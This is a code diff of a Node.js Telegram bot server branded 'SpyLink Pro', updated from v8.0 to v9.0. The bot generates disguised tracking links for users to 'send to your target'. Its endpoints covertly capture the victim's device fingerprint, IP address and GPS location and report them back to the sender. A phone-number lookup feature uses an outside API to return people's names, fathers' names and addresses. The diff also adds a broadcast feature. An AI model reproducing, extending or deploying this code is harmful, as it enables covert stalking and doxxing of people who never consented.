@@ -1,4 +1,4 @@
-// server.js — v8.0: ADMIN & HELP FIXED + DATA COLLECTION GUARANTEED
+// server.js — v9.0: URL Submission Fixed + Broadcast System + Improved UX
 const express = require("express");
 const cors = require('cors');
 const bodyParser = require('body-parser');
@@ -22,74 +22,72 @@ process.on('uncaughtException', console.error);
 // Middleware
 app.use(require('helmet')());
 app.use(require('compression')());
-app.use(require('morgan')('dev')); // ← Changed to 'dev' for detailed logs
+app.use(require('morgan')('dev'));
 app.use(cors({ origin: '*' }));
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.set("view engine", "ejs");
 
-// Sessions
+// State Management
 let sessions = {};
+let awaitingUrl = {}; // chatId -> true
+let broadcastMode = false;
+let broadcastTarget = null;
 
-// ==================== TELEGRAM BOT — FIXED COMMAND HANDLING ====================
+// ==================== TELEGRAM BOT — FIXED URL HANDLING ====================
 
 bot.on('message', async (msg) => {
   try {
     const chatId = msg.chat.id;
     const text = msg.text?.trim();
 
-    // Debug log
-    console.log(`📩 Received message from ${chatId}:`, text);
+    console.log(`📩 MESSAGE [${chatId}]:`, text);
 
-    // Handle URL submission reply
-    if (msg?.reply_to_message?.text === "🌐 Send the target URL (http:// or https://)") {
-      console.log("🔗 Handling URL submission...");
+    // 📢 BROADCAST MODE (Admin only)
+    if (broadcastMode && String(chatId) === ADMIN_CHAT_ID && text !== "/cancel") {
+      return await executeBroadcast(text);
+    }
+
+    // 🌐 URL SUBMISSION — FIXED: Works even without reply context
+    if (awaitingUrl[chatId] && text) {
+      delete awaitingUrl[chatId];
       return handleUrlSubmission(chatId, text);
     }
 
-    // Handle phone number reply
-    if (msg?.reply_to_message?.text === "📱 Send a phone number (e.g., 7800418265)") {
-      console.log("📞 Handling number info...");
+    // 📱 PHONE NUMBER SUBMISSION
+    if (msg?.reply_to_message?.text?.includes("phone number") && text) {
       return handleNumberInfo(chatId, text);
     }
 
-    // Command Router — NOW WITH DEBUG LOGS
-    if (text === "/start") {
-      console.log("🚀 /start triggered");
-      return sendWelcome(chatId);
-    }
-    if (text === "/create") {
-      console.log("🔗 /create triggered");
-      return requestUrl(chatId);
-    }
-    if (text === "/numberinfo") {
-      console.log("📱 /numberinfo triggered");
-      return requestPhoneNumber(chatId);
-    }
-    if (text === "/help") {
-      console.log("📘 /help triggered");
-      return sendHelp(chatId);
-    }
-    if (text === "/menu") {
-      console.log("🏠 /menu triggered");
-      return sendMainMenu(chatId);
-    }
+    // COMMANDS
+    if (text === "/start") return sendWelcome(chatId);
+    if (text === "/create") return requestUrl(chatId);
+    if (text === "/numberinfo") return requestPhoneNumber(chatId);
+    if (text === "/help") return sendHelp(chatId);
+    if (text === "/menu") return sendMainMenu(chatId);
     if (text === "/panel") {
-      console.log("🔐 /panel triggered by", chatId);
-      if (String(chatId) === ADMIN_CHAT_ID) {
-        return showAdminPanel(chatId);
-      } else {
-        bot.sendMessage(chatId, "⛔ Admin access required.");
-      }
-      return;
+      if (String(chatId) === ADMIN_CHAT_ID) return showAdminPanel(chatId);
+      else return bot.sendMessage(chatId, "⛔ Admin only.");
+    }
+    if (text === "/broadcast" && String(chatId) === ADMIN_CHAT_ID) {
+      return startBroadcast(chatId);
+    }
+    if (text === "/cancel" && broadcastMode && String(chatId) === ADMIN_CHAT_ID) {
+      broadcastMode = false;
+      broadcastTarget = null;
+      return bot.sendMessage(chatId, "🛑 Broadcast cancelled.");
     }
 
-    // Default: ignore random messages
-    console.log("🗑️ Ignored message:", text);
+    // DEFAULT: If user sends URL directly without /create
+    if (text?.match(/^https?:\/\//i)) {
+      return handleUrlSubmission(chatId, text); // ← DIRECT FIX: Accept URL anytime
+    }
+
+    console.log("🗑️ No handler for:", text);
 
   } catch (error) {
-    console.error("❌ Message handler crashed:", error);
-    bot.sendMessage(msg.chat.id, "⚠️ Internal error. Admin notified.");
+    console.error("❌ Message handler error:", error);
+    bot.sendMessage(msg.chat.id, "⚠️ Something went wrong. Please retry.");
   }
 });
 
@@ -99,199 +97,117 @@ bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
 
-    console.log(`🖱️ Callback from ${chatId}:`, data);
+    console.log(`🖱️ CALLBACK [${chatId}]:`, data);
 
-    // Admin actions
+    // ADMIN ACTIONS
     if (data === "admin_sessions") return viewAllSessions(chatId);
     if (data === "admin_stats") return sendStats(chatId);
     if (data === "admin_clear") return clearAllSessions(chatId);
+    if (data === "admin_broadcast") return startBroadcast(chatId);
 
-    // User actions
-    if (data === "create_new") return requestUrl(chatId);
+    // USER ACTIONS
+    if (data === "create_new") {
+      awaitingUrl[chatId] = true;
+      return bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
+        reply_markup: { force_reply: true }
+      });
+    }
     if (data === "number_info") return requestPhoneNumber(chatId);
     if (data === "main_menu") return sendMainMenu(chatId);
     if (data === "help_cmd") return sendHelp(chatId);
     if (data === "back_to_panel") return showAdminPanel(chatId);
 
   } catch (error) {
-    console.error("❌ Callback handler crashed:", error);
+    console.error("❌ Callback error:", error);
   }
 });
 
-// ==================== NUMBER INFO — USING YOUR API ====================
+// ==================== BROADCAST SYSTEM ====================
 
-async function handleNumberInfo(chatId, input) {
-  let number = input.replace(/\D/g, '');
+async function startBroadcast(chatId) {
+  broadcastMode = true;
+  broadcastTarget = "ALL"; // Could be segmented later
+  bot.sendMessage(chatId, "📣 *BROADCAST MODE ACTIVATED*\n\nSend the message you want to broadcast to ALL users.\n\nSend /cancel to abort.", {
+    parse_mode: "Markdown"
+  });
+}
 
-  if (BANNED_NUMBERS.includes(number)) {
-    return bot.sendMessage(chatId, "❌ This number is restricted.", {
-      reply_markup: { inline_keyboard: [[{text:"📱 Try Another",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
-    });
-  }
+async function executeBroadcast(messageText) {
+  const totalUsers = new Set(Object.values(sessions).map(s => s.chatId));
+  let sentCount = 0;
+  let errorCount = 0;
 
-  if (!number || number.length < 10) {
-    return bot.sendMessage(chatId, "❌ Send 10+ digit number (e.g., 7800418265)", {
-      reply_markup: { inline_keyboard: [[{text:"📱 Retry",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
-    });
-  }
+  // Add admin as recipient too
+  totalUsers.add(parseInt(ADMIN_CHAT_ID));
 
-  try {
-    const res = await axios.get(`https://demon.taitanx.workers.dev/?mobile=${number}`, { timeout: 8000 });
-    const data = res.data;
-
-    if (!data.data?.length) {
-      return bot.sendMessage(chatId, "🔍 No data found.", {
-        reply_markup: { inline_keyboard: [[{text:"📱 Try Another",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
+  for (let userId of totalUsers) {
+    if (!userId) continue;
+    try {
+      await bot.sendMessage(userId, messageText, {
+        parse_mode: "HTML", // Allows formatting without "forwarded" tag
+        disable_web_page_preview: false
       });
+      sentCount++;
+    } catch (err) {
+      console.error(`Failed to send to ${userId}:`, err.message);
+      errorCount++;
     }
-
-    let msg = `📞 *RESULTS FOR: \`${number}\`*\n\n`;
-    data.data.slice(0,3).forEach(rec => {
-      let addr = (rec.address || "").split('!').filter(x=>x).join(', ');
-      msg += `👤 *Name:* ${rec.name || 'N/A'}\n`;
-      msg += `👨 *Father:* ${rec.fname || 'N/A'}\n`;
-      msg += `📬 *Address:* ${addr || 'N/A'}\n`;
-      if (rec.alt) msg += `📲 *Alt:* \`${rec.alt}\`\n`;
-      msg += `📡 *Circle:* ${rec.circle || 'N/A'}\n---\n\n`;
-    });
-
-    bot.sendMessage(chatId, msg, {
-      parse_mode: "Markdown",
-      reply_markup: { inline_keyboard: [[{text:"📱 New Lookup",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
-    });
-
-  } catch (err) {
-    console.error("📱 Number API Error:", err.message);
-    bot.sendMessage(chatId, "⚠️ Service unavailable. Try again later.", {
-      reply_markup: { inline_keyboard: [[{text:"📱 Retry",callback_data:"number_info"}],[{text:"🏠 Menu",callback_data:"main_menu"}]] }
-    });
+    // Avoid rate limits
+    await new Promise(r => setTimeout(r, 100));
   }
+
+  broadcastMode = false;
+  broadcastTarget = null;
+
+  bot.sendMessage(ADMIN_CHAT_ID, `
+✅ *BROADCAST COMPLETED*
+
+📬 Sent to: ${sentCount} users
+❌ Failed: ${errorCount}
+`, { parse_mode: "Markdown" });
 }
 
-function requestPhoneNumber(chatId) {
-  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
-    reply_markup: { force_reply: true }
-  });
-}
-
-// ==================== ADMIN PANEL — NOW GUARANTEED TO WORK ====================
-
-function showAdminPanel(chatId) {
-  console.log(`🔐 Admin panel opened for ${chatId}`);
-  const total = Object.keys(sessions).length;
-  const reported = Object.values(sessions).filter(s => s.reported).length;
-
-  bot.sendMessage(chatId, `
-🔐 *ADMIN DASHBOARD*
-
-📊 Sessions: ${total}
-✅ Reported: ${reported}
-⏳ Pending: ${total - reported}
-⏱️ Uptime: ${Math.floor(process.uptime())}s
-
-👇 Choose action:
-`, {
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "👁️ View Sessions", callback_data: "admin_sessions" }],
-        [{ text: "📈 Stats", callback_data: "admin_stats" }],
-        [{ text: "🗑️ Clear All", callback_data: "admin_clear" }],
-        [{ text: "🏠 Menu", callback_data: "main_menu" }]
-      ]
-    }
-  });
-}
-
-function viewAllSessions(chatId) {
-  let list = Object.entries(sessions).slice(0,20);
-  let msg = list.length ? "*📋 ACTIVE SESSIONS*\n\n" : "📭 No sessions.\n";
-
-  list.forEach(([id, s], i) => {
-    msg += `${i+1}. *${id.substring(0,6)}...*\n`;
-    msg += `   👤 User: ${s.chatId}\n`;
-    msg += `   ✅ ${s.reported ? 'Delivered' : 'Pending'}\n`;
-    msg += `   🌐 ${s.url ? s.url.replace(/^https?:\/\//, '').substring(0,20) + '...' : 'N/A'}\n`;
-    msg += `   📍 ${s.location ? 'Got Location' : 'No Location'}\n---\n`;
-  });
-
-  bot.sendMessage(chatId, msg, {
-    parse_mode: "Markdown",
-    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
-  });
-}
-
-function sendStats(chatId) {
-  const mem = process.memoryUsage();
-  bot.sendMessage(chatId, `
-📊 *REAL-TIME STATS*
-
-📈 Sessions: ${Object.keys(sessions).length}
-MemoryWarning: ${(mem.heapUsed/1024/1024).toFixed(1)} MB
-⏱️ Uptime: ${Math.floor(process.uptime())} sec
-`, {
-    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
-  });
-}
-
-function clearAllSessions(chatId) {
-  const count = Object.keys(sessions).length;
-  sessions = {};
-  bot.sendMessage(chatId, `✅ Cleared ${count} sessions.`, {
-    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
-  });
-}
-
-// ==================== DATA ENDPOINTS — SIMPLIFIED & LOGGED ====================
+// ==================== DATA ENDPOINTS (UNCHANGED — WORKING) ====================
 
 app.post("/data", (req, res) => {
   const { uid, data } = req.body;
-  console.log("📡 /data hit | UID:", uid); // ← Critical Debug Log
+  console.log("📡 /data hit | UID:", uid);
 
-  if (!uid || !data) {
-    console.warn("❌ /data missing params");
-    return res.status(400).send("Missing uid or data");
-  }
+  if (!uid || !data) return res.status(400).send("Missing params");
 
   if (!sessions[uid]) {
     sessions[uid] = { chatId: parseInt(uid, 36), createdAt: new Date() };
-    console.log("🆕 New session created:", uid);
+    console.log("🆕 New session:", uid);
   }
 
   sessions[uid].data = decodeURIComponent(data);
   sessions[uid].ip = getIP(req);
   sessions[uid].lastData = new Date();
 
-  console.log("✅ Data saved for session:", uid);
   checkAndDeliver(uid);
   res.send("OK");
 });
 
 app.post("/location", (req, res) => {
   const { uid, lat, lon } = req.body;
-  console.log("📍 /location hit | UID:", uid, "| Lat:", lat, "| Lon:", lon);
+  console.log("📍 /location hit | UID:", uid);
 
-  if (!uid || !lat || !lon) {
-    console.warn("❌ /location missing params");
-    return res.status(400).send("Missing uid, lat, or lon");
-  }
+  if (!uid || !lat || !lon) return res.status(400).send("Missing params");
 
   if (sessions[uid]) {
     sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(req.body.acc || 0) };
     sessions[uid].lastLocation = new Date();
-    console.log("✅ Location saved for session:", uid);
     checkAndDeliver(uid);
   }
   res.send("OK");
 });
 
-// Delivery — ONLY requires data (location optional now for testing)
 function checkAndDeliver(sessionId) {
   const session = sessions[sessionId];
-  if (!session || session.reported || !session.data) return; // ← Removed location requirement temporarily for testing
+  if (!session || session.reported || !session.data) return;
 
   session.reported = true;
-  console.log("📤 Delivering report to user:", session.chatId);
+  console.log("📤 Delivering to:", session.chatId);
 
   let cleanData = session.data
     .replaceAll("<br>", "\n")
@@ -301,25 +217,23 @@ function checkAndDeliver(sessionId) {
     .replaceAll("</code>", "`");
 
   let msg = `
-✅ *REPORT DELIVERED*
+✅ <b>FULL REPORT RECEIVED</b>
 
-🆔 Session: \`${sessionId}\`
-🌐 URL: ${session.url || 'N/A'}
-📡 IP: \`${session.ip || 'Unknown'}\`
-🕒 Time: ${new Date().toLocaleTimeString()}
+🆔 <b>Session:</b> <code>${sessionId}</code>
+🌐 <b>URL:</b> ${session.url || 'N/A'}
+📡 <b>IP:</b> <code>${session.ip || 'Unknown'}</code>
+🕒 <b>Time:</b> ${new Date().toLocaleTimeString()}
 
-📱 *DEVICE DATA:*
-${cleanData}
+📱 <b>DEVICE DATA:</b>
+${cleanData.replace(/\*/g, '')}
 `;
 
   if (session.location) {
-    msg += `\n\n🗺️ *LOCATION:*\nLat: \`${session.location.lat}\`\nLon: \`${session.location.lon}\`\nAccuracy: \`${session.location.accuracy}m\``;
-  } else {
-    msg += "\n\n⚠️ *Location: Not captured (testing mode)*";
+    msg += `\n\n🗺️ <b>LOCATION:</b>\nLat: <code>${session.location.lat}</code>\nLon: <code>${session.location.lon}</code>\nAccuracy: <code>${session.location.accuracy}m</code>`;
   }
 
   bot.sendMessage(session.chatId, msg, {
-    parse_mode: "Markdown",
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
         [{ text: "🆕 New Link", callback_data: "create_new" }],
@@ -327,9 +241,7 @@ ${cleanData}
         [{ text: "🏠 Menu", callback_data: "main_menu" }]
       ]
     }
-  }).catch(err => {
-    console.error("❌ Failed to send report:", err.message);
-  });
+  }).catch(console.error);
 }
 
 // ==================== UTILITIES ====================
@@ -340,7 +252,7 @@ function getIP(req) {
 
 function handleUrlSubmission(chatId, url) {
   if (!url || !/^https?:\/\//i.test(url)) {
-    return bot.sendMessage(chatId, "❌ Must be http:// or https://");
+    return bot.sendMessage(chatId, "❌ Please send a valid URL starting with http:// or https://");
   }
 
   const sessionId = uuidv4();
@@ -349,54 +261,68 @@ function handleUrlSubmission(chatId, url) {
   const link = `${HOST_URL}/c/${sessionId}/${btoa(encodeURIComponent(url))}`;
 
   bot.sendMessage(chatId, `
-🚀 *LINK READY*
+🚀 <b>TRACKING LINK READY</b>
 
-🔗 Target: ${url}
-🆔 Session: \`${sessionId}\`
+🔗 <b>Target:</b> ${url}
+🆔 <b>Session ID:</b> <code>${sessionId}</code>
 
-🌐 Send this:
+🌐 <b>Send this link to your target:</b>
 ${link}
 
-⏱️ Open on mobile for best results.
+⏱️ Open on mobile for location + full fingerprint.
 `, {
-    parse_mode: "Markdown",
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "🆕 New Link", callback_data: "create_new" }],
-        [{ text: "📱 Number Info", callback_data: "number_info" }],
-        [{ text: "🏠 Menu", callback_data: "main_menu" }]
+        [{ text: "🆕 Create Another", callback_data: "create_new" }],
+        [{ text: "📱 Number Lookup", callback_data: "number_info" }],
+        [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
       ]
     }
   });
 }
 
 function requestUrl(chatId) {
-  bot.sendMessage(chatId, "🌐 Send URL (http:// or https://)", { reply_markup: { force_reply: true } });
+  awaitingUrl[chatId] = true;
+  bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
+    reply_markup: { force_reply: true }
+  });
 }
 
-// ✅ HELP FIXED — Simple, guaranteed response
+function requestPhoneNumber(chatId) {
+  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
+    reply_markup: { force_reply: true }
+  });
+}
+
+// HELP — Simplified HTML
 function sendHelp(chatId) {
   bot.sendMessage(chatId, `
-📘 *HELP MENU*
+📘 <b>HELP GUIDE</b>
 
-*TRACKING LINK:*
+<b>TRACKING LINK:</b>
 1. Tap "Create Link"
 2. Send any URL
 3. Send generated link to target
-4. Get full device report
+4. Get full device + location report
 
-*PHONE LOOKUP:*
+<b>PHONE LOOKUP:</b>
 Send 10-digit number (e.g., 7800418265)
 
-*COMMANDS:*
+<b>BANNED NUMBERS:</b>
+9161636853, 9451180555, 6306791897
+
+<b>COMMANDS:</b>
 /start - Welcome
 /create - New link
-/numberinfo - Lookup number
-/panel - Admin (restricted)
-/help - This menu
+/numberinfo - Lookup
+/panel - Admin
+/broadcast - (Admin) Send to all
+/help - This guide
 
 👨‍💻 @aadi_io
 `, {
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
         [{ text: "🚀 Create Link", callback_data: "create_new" }],
@@ -408,22 +334,8 @@ Send 10-digit number (e.g., 7800418265)
 }
 
 function sendMainMenu(chatId) {
-  bot.sendMessage(chatId, "🏠 *MAIN MENU*", {
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "🚀 Create Link", callback_data: "create_new" }],
-        [{ text: "📱 Number Info", callback_data: "number_info" }],
-        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
-        [{ text: "📘 Help", callback_data: "help_cmd" }]
-      ]
-    }
-  });
-}
-
-function sendWelcome(chatId) {
-  bot.sendMessage(chatId, "🎯 *Welcome!* Choose an option below 👇", {
-    parse_mode: "Markdown",
+  bot.sendMessage(chatId, "🏠 <b>MAIN MENU</b>", {
+    parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
         [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
@@ -432,6 +344,91 @@ function sendWelcome(chatId) {
         [{ text: "📘 Help", callback_data: "help_cmd" }]
       ]
     }
+  });
+}
+
+function sendWelcome(chatId) {
+  bot.sendMessage(chatId, "🎯 <b>Welcome to SpyLink Pro!</b>\n\nChoose an option below 👇", {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "🚀 Create Tracking Link", callback_data: "create_new" }],
+        [{ text: "📱 Number Info Lookup", callback_data: "number_info" }],
+        [{ text: "🔐 Admin Panel", callback_data: "panel" }],
+        [{ text: "📘 Help", callback_data: "help_cmd" }]
+      ]
+    }
+  });
+}
+
+// ==================== ADMIN PANEL ====================
+
+function showAdminPanel(chatId) {
+  const total = Object.keys(sessions).length;
+  const reported = Object.values(sessions).filter(s => s.reported).length;
+
+  bot.sendMessage(chatId, `
+🔐 <b>ADMIN PANEL</b>
+
+📊 Sessions: ${total}
+✅ Reported: ${reported}
+⏳ Pending: ${total - reported}
+⏱️ Uptime: ${Math.floor(process.uptime())}s
+
+👇 <b>ACTIONS:</b>
+`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "👁️ View Sessions", callback_data: "admin_sessions" }],
+        [{ text: "📈 Stats", callback_data: "admin_stats" }],
+        [{ text: "🗑️ Clear All", callback_data: "admin_clear" }],
+        [{ text: "📣 Broadcast", callback_data: "admin_broadcast" }],
+        [{ text: "🏠 Menu", callback_data: "main_menu" }]
+      ]
+    }
+  });
+}
+
+function viewAllSessions(chatId) {
+  let list = Object.entries(sessions).slice(0,20);
+  let msg = list.length ? "<b>📋 ACTIVE SESSIONS</b>\n\n" : "📭 No active sessions.\n";
+
+  list.forEach(([id, s], i) => {
+    msg += `<b>${i+1}. ${id.substring(0,6)}...</b>\n`;
+    msg += `👤 User: ${s.chatId}\n`;
+    msg += `✅ Status: ${s.reported ? 'Delivered' : 'Pending'}\n`;
+    msg += `🌐 URL: ${s.url ? s.url.replace(/^https?:\/\//, '').substring(0,25) + '...' : 'N/A'}\n`;
+    msg += `📍 Location: ${s.location ? 'Captured' : 'None'}\n---\n`;
+  });
+
+  bot.sendMessage(chatId, msg, {
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
+  });
+}
+
+function sendStats(chatId) {
+  const mem = process.memoryUsage();
+  bot.sendMessage(chatId, `
+📊 <b>SERVER STATS</b>
+
+📈 Sessions: ${Object.keys(sessions).length}
+MemoryWarning: ${(mem.heapUsed/1024/1024).toFixed(1)} MB
+⏱️ Uptime: ${Math.floor(process.uptime())} sec
+👥 Unique Users: ${new Set(Object.values(sessions).map(s => s.chatId)).size}
+`, {
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
+  });
+}
+
+function clearAllSessions(chatId) {
+  const count = Object.keys(sessions).length;
+  sessions = {};
+  bot.sendMessage(chatId, `✅ <b>Cleared ${count} sessions.</b>`, {
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{text:"🔙 Back",callback_data:"back_to_panel"}]] }
   });
 }
 
@@ -457,27 +454,26 @@ app.get("/c/:sessionId/:encodedUrl", (req, res) => {
 });
 
 app.get("/", (req, res) => {
-  res.json({ ok: true, version: "8.0-FIXED", sessions: Object.keys(sessions).length });
+  res.json({ ok: true, version: "9.0-BROADCAST", sessions: Object.keys(sessions).length });
 });
 
-// Cleanup every 20 minutes
+// Cleanup every 15 minutes
 setInterval(() => {
   const now = new Date();
   let count = 0;
   for (let id in sessions) {
-    if (now - new Date(sessions[id].createdAt) > 1200000) { // 20 min
+    if (now - new Date(sessions[id].createdAt) > 900000) { // 15 min
       delete sessions[id];
       count++;
     }
   }
   if (count > 0) console.log(`🧹 Cleaned ${count} old sessions`);
-}, 1200000);
+}, 900000);
 
 // Start Server
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000; // ← Render uses 10000
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`✅ SERVER v8.0 READY`);
+  console.log(`✅ SERVER v9.0 READY — BROADCAST SYSTEM ADDED`);
   console.log(`🔗 Port: ${PORT}`);
   console.log(`🌐 Host: ${HOST_URL}`);
-  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 12)}...`);
 });
